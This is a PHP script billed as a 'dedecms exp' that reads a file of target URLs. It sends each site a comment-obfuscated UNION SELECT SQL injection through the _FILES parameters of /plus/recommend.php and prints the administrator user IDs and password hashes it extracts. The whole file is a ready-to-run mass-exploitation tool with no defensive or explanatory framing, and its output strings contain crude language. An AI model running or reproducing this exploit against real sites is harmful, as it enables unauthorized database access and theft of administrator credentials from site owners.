<?php

print_r(
"
+------------------------------------+
dedecms exp
Usage: $argv[0] Filename
Example: php.exe $argv[0] url.txt
+------------------------------------+
\r\n\r\n\r\n"
);
$filename=$argv[1];
if(!file_exists($filename)) echo "define the url.txt file\r\n";
$conts = file_get_contents($filename);
$arrConts = explode("\n",$conts);
$arrConts=str_replace(" ","",$arrConts);
$arrConts=str_replace("\r","",$arrConts);
$arrConts=str_replace("\n","",$arrConts);
//print_r($arrConts );
for($i=0;isset($arrConts[$i]);$i++){
echo fuckdede($arrConts[$i]);
}

function fuckdede($sb){
$sb=str_replace("http://","",$sb);
$expp="http://".$sb."/plus/recommend.php?aid=1&_FILES[type][name]&_FILES[type][size]&_FILES[type][type]&_FILES[type][tmp_name]=aa\'and+char(@`'`)+/*!50000Union*/+/*!50000SeLect*/+1,2,3,concat(0x3C6162633E,group_concat(0x7C,userid,0x3a,pwd,0x7C),0x3C2F6162633E),5,6,7,8,9%20from%20`%23@__admin`%23";
$exp=@file_get_contents($expp);
eregi("_<abc>(.*)</abc>_", $exp, $arr);
$exploit=str_replace("_<abc>", "==fuck", $arr[0]);
$exploit=str_replace("</abc>_", "fuck==", $exploit);
return "url:".$sb." inject resulut:".$exploit."\r\n--------------------------\r\n";
}
?>
